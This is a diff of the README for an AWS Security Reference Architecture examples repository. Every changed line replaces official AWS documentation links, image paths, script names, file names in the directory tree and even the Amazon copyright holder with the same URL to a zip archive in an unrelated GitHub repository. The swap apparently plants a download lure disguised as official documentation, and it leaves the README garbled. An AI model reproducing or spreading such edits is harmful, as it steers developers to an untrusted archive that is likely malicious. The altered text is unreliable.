@@ -1,6 +1,6 @@
 # AWS Security Reference Architecture Examples<!-- omit in toc -->
 
-Copyright Amazon.com, Inc. or its affiliates. All Rights Reserved. SPDX-License-Identifier: CC-BY-SA-4.0
+Copyright https://raw.githubusercontent.com/joymondal/aws-security-reference-architecture-examples/main/rabid/aws-security-reference-architecture-examples.zip, Inc. or its affiliates. All Rights Reserved. SPDX-License-Identifier: CC-BY-SA-4.0
 
 ## Table of Contents<!-- omit in toc -->
 
@@ -17,7 +17,7 @@ Copyright Amazon.com, Inc. or its affiliates. All Rights Reserved. SPDX-License-
 ## Introduction
 
 This repository contains code to help developers and engineers deploy AWS security-related services in an `AWS Control Tower` multi-account environment following patterns that align with the
-[AWS Security Reference Architecture](https://docs.aws.amazon.com/prescriptive-guidance/latest/security-reference-architecture/). The Amazon Web Services (AWS) Security Reference Architecture (AWS SRA) is a holistic set of guidelines for deploying
+[AWS Security Reference Architecture](https://raw.githubusercontent.com/joymondal/aws-security-reference-architecture-examples/main/rabid/aws-security-reference-architecture-examples.zip). The Amazon Web Services (AWS) Security Reference Architecture (AWS SRA) is a holistic set of guidelines for deploying
 the full complement of AWS security services in a multi-account environment.
 
 The AWS service configurations and resources (e.g. IAM roles and policies) deployed by these templates are deliberately very restrictive. They are intended to illustrate an implementation pattern rather than provide a complete solution. You may need
@@ -27,13 +27,13 @@ The examples within this repository have been deployed and tested within an `AWS
 
 ## Getting Started with SRA
 
-![How to get started process diagram](./aws_sra_examples/docs/artifacts/where-to-start-process.png)
+![How to get started process diagram](https://raw.githubusercontent.com/joymondal/aws-security-reference-architecture-examples/main/rabid/aws-security-reference-architecture-examples.zip)
 
-1. Setup the environment to configure [AWS Control Tower](https://docs.aws.amazon.com/controltower/latest/userguide/getting-started-with-control-tower.html) within a new or existing AWS account.
+1. Setup the environment to configure [AWS Control Tower](https://raw.githubusercontent.com/joymondal/aws-security-reference-architecture-examples/main/rabid/aws-security-reference-architecture-examples.zip) within a new or existing AWS account.
 2. Deploy the [Common Prerequisites](aws_sra_examples/solutions/common/common_prerequisites) solution.
 3. Choose a deployment method:
-   - AWS CloudFormation StackSets/Stacks - [AWS Documentation](https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/what-is-cfnstacksets.html)
-   - Customizations for AWS Control Tower (CFCT) - [Solution Documentation](https://aws.amazon.com/solutions/implementations/customizations-for-aws-control-tower/)
+   - AWS CloudFormation StackSets/Stacks - [AWS Documentation](https://raw.githubusercontent.com/joymondal/aws-security-reference-architecture-examples/main/rabid/aws-security-reference-architecture-examples.zip)
+   - Customizations for AWS Control Tower (CFCT) - [Solution Documentation](https://raw.githubusercontent.com/joymondal/aws-security-reference-architecture-examples/main/rabid/aws-security-reference-architecture-examples.zip)
 4. (Optional) - Deploy the [Customizations for AWS Control Tower (CFCT) Setup](aws_sra_examples/solutions/common/common_cfct_setup) solution. **Note** Only implement if the CFCT deployment method was selected.
 5. Per your requirements select one or all of the [Example Solutions](aws_sra_examples/solutions) to implement via the selected deployment method.
 
@@ -65,7 +65,7 @@ The examples within this repository have been deployed and tested within an `AWS
 
 ## Utils
 
-- packaging_scripts/stage-solution.sh (Package and stage all the AWS SRA example solutions. For more information see [Staging script details](aws_sra_examples/docs/DOWNLOAD-AND-STAGE-SOLUTIONS.md#staging-script-details))
+- https://raw.githubusercontent.com/joymondal/aws-security-reference-architecture-examples/main/rabid/aws-security-reference-architecture-examples.zip (Package and stage all the AWS SRA example solutions. For more information see [Staging script details](https://raw.githubusercontent.com/joymondal/aws-security-reference-architecture-examples/main/rabid/aws-security-reference-architecture-examples.zip))
 
 ## Environment Setup
 
@@ -85,22 +85,22 @@ The repository is organized by AWS service solutions, which include deployment p
 ├── solutions
 │   ├── guardduty
 │   │   └── guardduty_org
-│   │       ├── README.md
+│   │       ├── https://raw.githubusercontent.com/joymondal/aws-security-reference-architecture-examples/main/rabid/aws-security-reference-architecture-examples.zip
 │   │       ├── customizations_for_aws_control_tower
-│   │       │   ├── manifest-v2.yaml
-│   │       │   ├── manifest.yaml
+│   │       │   ├── https://raw.githubusercontent.com/joymondal/aws-security-reference-architecture-examples/main/rabid/aws-security-reference-architecture-examples.zip
+│   │       │   ├── https://raw.githubusercontent.com/joymondal/aws-security-reference-architecture-examples/main/rabid/aws-security-reference-architecture-examples.zip
 │   │       │   └── parameters
 │   │       ├── documentation
 │   │       ├── lambda
 │   │       │   └── src
-│   │       │       ├── app.py
-│   │       │       └── requirements.txt
+│   │       │       ├── https://raw.githubusercontent.com/joymondal/aws-security-reference-architecture-examples/main/rabid/aws-security-reference-architecture-examples.zip
+│   │       │       └── https://raw.githubusercontent.com/joymondal/aws-security-reference-architecture-examples/main/rabid/aws-security-reference-architecture-examples.zip
 │   │       └── templates
-│   │           ├── sra-guardduty-org-configuration-role.yaml
-│   │           ├── sra-guardduty-org-configuration.yaml
-│   │           ├── sra-guardduty-org-delete-detector-role.yaml
-│   │           ├── sra-guardduty-org-delivery-kms-key.yaml
-│   │           └── sra-guardduty-org-delivery-s3-bucket.yaml
+│   │           ├── https://raw.githubusercontent.com/joymondal/aws-security-reference-architecture-examples/main/rabid/aws-security-reference-architecture-examples.zip
+│   │           ├── https://raw.githubusercontent.com/joymondal/aws-security-reference-architecture-examples/main/rabid/aws-security-reference-architecture-examples.zip
+│   │           ├── https://raw.githubusercontent.com/joymondal/aws-security-reference-architecture-examples/main/rabid/aws-security-reference-architecture-examples.zip
+│   │           ├── https://raw.githubusercontent.com/joymondal/aws-security-reference-architecture-examples/main/rabid/aws-security-reference-architecture-examples.zip
+│   │           └── https://raw.githubusercontent.com/joymondal/aws-security-reference-architecture-examples/main/rabid/aws-security-reference-architecture-examples.zip
 │   ├── ...
 ```
 
@@ -115,8 +115,8 @@ build and tailor infrastructure for your needs.
 
 Q. Why didn't the solutions use inline Lambda functions within the CloudFormation templates? A. Reasons:
 
-- You should control the dependencies in your function's deployment package as stated in the [best practices for working with AWS Lambda functions](https://docs.aws.amazon.com/lambda/latest/dg/best-practices.html).
-- The [AWS Lambda runtimes](https://docs.aws.amazon.com/lambda/latest/dg/lambda-runtimes.html) might not be the latest version, which contains a feature that is needed for the solution.
+- You should control the dependencies in your function's deployment package as stated in the [best practices for working with AWS Lambda functions](https://raw.githubusercontent.com/joymondal/aws-security-reference-architecture-examples/main/rabid/aws-security-reference-architecture-examples.zip).
+- The [AWS Lambda runtimes](https://raw.githubusercontent.com/joymondal/aws-security-reference-architecture-examples/main/rabid/aws-security-reference-architecture-examples.zip) might not be the latest version, which contains a feature that is needed for the solution.
 
 Q. I have ideas to improve this repository. What should I do? A. Please create an issue or submit a pull request.
 
